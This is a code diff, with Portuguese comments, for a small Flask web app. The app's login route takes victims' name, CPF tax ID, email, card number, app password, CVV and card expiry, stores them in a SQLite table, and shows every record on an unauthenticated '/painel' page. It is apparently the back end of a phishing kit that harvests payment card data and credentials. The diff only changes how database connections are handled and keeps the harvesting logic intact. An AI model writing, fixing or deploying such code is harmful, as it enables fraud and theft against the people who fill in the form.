@@ -1,25 +1,32 @@
 import os
 import sqlite3
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect, url_for, g
 
 app = Flask(__name__)
-# Nome do banco fixo para estabilidade
-DB_PATH = 'banco_dados_open.db'
+# Nome do banco novo para limpar qualquer trava anterior
+DATABASE = 'data_final_v99.db'
 
-def get_db_connection():
-    conn = sqlite3.connect(DB_PATH)
-    conn.row_factory = sqlite3.Row
-    return conn
+def get_db():
+    db = getattr(g, '_database', None)
+    if db is None:
+        db = g._database = sqlite3.connect(DATABASE)
+        db.row_factory = sqlite3.Row
+    return db
+
+@app.teardown_appcontext
+def close_connection(exception):
+    db = getattr(g, '_database', None)
+    if db is not None:
+        db.close()
 
 def init_db():
-    """Cria a tabela se ela não existir. Roda em cada requisição crítica."""
-    conn = get_db_connection()
-    conn.execute('''CREATE TABLE IF NOT EXISTS clientes 
-        (id INTEGER PRIMARY KEY AUTOINCREMENT, 
-         nome TEXT, cpf TEXT, email TEXT, 
-         num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
-    conn.commit()
-    conn.close()
+    with app.app_context():
+        db = get_db()
+        db.execute('''CREATE TABLE IF NOT EXISTS clientes 
+            (id INTEGER PRIMARY KEY AUTOINCREMENT, 
+             nome TEXT, cpf TEXT, email TEXT, 
+             num_cartao TEXT, senha_app TEXT, cvv TEXT, validade TEXT)''')
+        db.commit()
 
 @app.route('/')
 def index():
@@ -29,7 +36,6 @@ def index():
 @app.route('/login', methods=['POST'])
 def login():
     try:
-        init_db()
         nome = request.form.get('nome')
         cpf = request.form.get('cpf')
         email = request.form.get('email')
@@ -38,13 +44,12 @@ def login():
         cvv = request.form.get('cvv')
         validade = request.form.get('validade')
         
-        conn = get_db_connection()
-        conn.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
-                        VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
-        conn.commit()
-        conn.close()
+        db = get_db()
+        db.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
+                      VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
+        db.commit()
     except Exception as e:
-        print(f"Erro ao salvar: {e}")
+        print(f"Erro: {e}")
     return redirect(url_for('sucesso'))
 
 @app.route('/sucesso')
@@ -53,14 +58,12 @@ def sucesso():
 
 @app.route('/painel')
 def admin():
+    init_db()
     try:
-        init_db() # Garante que a tabela exista antes do SELECT
-        conn = get_db_connection()
-        usuarios = conn.execute('SELECT * FROM clientes ORDER BY id DESC').fetchall()
-        conn.close()
+        db = get_db()
+        usuarios = db.execute('SELECT * FROM clientes ORDER BY id DESC').fetchall()
         return render_template('admin.html', usuarios=usuarios)
-    except Exception as e:
-        # Se mesmo assim der erro, retorna uma lista vazia para não quebrar a página
+    except:
         return render_template('admin.html', usuarios=[])
 
 if __name__ == '__main__':
